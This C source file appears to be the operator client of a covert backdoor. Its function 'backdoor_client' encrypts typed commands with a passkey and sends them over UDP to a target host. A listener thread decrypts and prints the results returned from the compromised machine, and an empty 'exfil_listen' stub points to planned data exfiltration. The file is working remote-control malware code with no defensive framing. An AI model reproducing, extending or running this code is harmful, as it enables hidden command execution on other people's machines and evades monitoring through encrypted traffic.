#include <pthread.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>

#include "crypto.h"
#include "client.h"
#include "defs.h"
#include "util.h"

int closing;

void backdoor_client(uint32 ipaddr, int dport, int duplex)
{
	int sock;
	struct sockaddr_in saddr;
	char command[MAX_LEN];
	pthread_t list_thread;

	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	bzero(&saddr, sizeof(saddr));
	
	if (ipaddr == 0)
		error("Invalid IP specified.");

	if (!val_port(dport))
		error("Invalid destination port specified.");

	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = ipaddr;
	saddr.sin_port = htons(dport);

	if (duplex)
	{
		closing = 0;
		pthread_create(&list_thread, NULL, listen_thread, &saddr);
	}

	printf("Ready, awaiting your command...\n");
	while(fgets(command, MAX_LEN, stdin) != NULL)
	{
		char buff[MAX_LEN];
		char *ptr = buff;
		char *enc;
		int len;
		int hdr_len;

		hdr_len = strlen(HDR_KEY);
	
		memcpy(ptr, HDR_KEY, hdr_len);
		ptr += hdr_len;
		memcpy(ptr, CMD_STR, strlen(CMD_STR));
		ptr += strlen(CMD_STR);
		memcpy(ptr, command, strlen(command));
		ptr += strlen(command);
		memcpy(ptr, CMD_END, strlen(CMD_END));
		ptr += strlen(CMD_END);
		
		len = strlen(buff);

		ptr = buff + hdr_len;
		
		enc = encrypt(PASSKEY, ptr, len - hdr_len);

		memcpy(ptr, enc, len - hdr_len);
	
		sendto(sock, buff, len, 0, (struct sockaddr *)&saddr, sizeof(saddr));

		free(enc);
	}	

	// Listen thread cleanup
	if (duplex)
	{
		closing = 1;
		pthread_join(list_thread, NULL);
	}
}

void *listen_thread(void *arg)
{
	struct sockaddr_in saddr = *(struct sockaddr_in*)arg;
	int sock;
	char buff[MAX_LEN];

	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	printf("Listen thread active.\n");
	
	saddr.sin_addr.s_addr = htonl(INADDR_ANY);

	if (bind(sock, (struct sockaddr*)&saddr, sizeof(saddr)) < 0)
		error("Unable to bind result port.\n");

	while(!closing)
	{
		char *dec;
		int len;

		socklen_t size = sizeof(saddr);
		len = recvfrom(sock, buff, MAX_LEN, 0, (struct sockaddr*)&saddr, &size);

		dec = decrypt(PASSKEY, buff, len);
		memcpy(buff, dec, len);
		free(dec);

		buff[len] = 0x0;
		printf("%s", buff);
	}

	return NULL;
}

int val_port(int port)
{
	if (0 < port && port < 65535)
		return 1;
	else 
		return 0;
}

void exfil_listen()
{

}
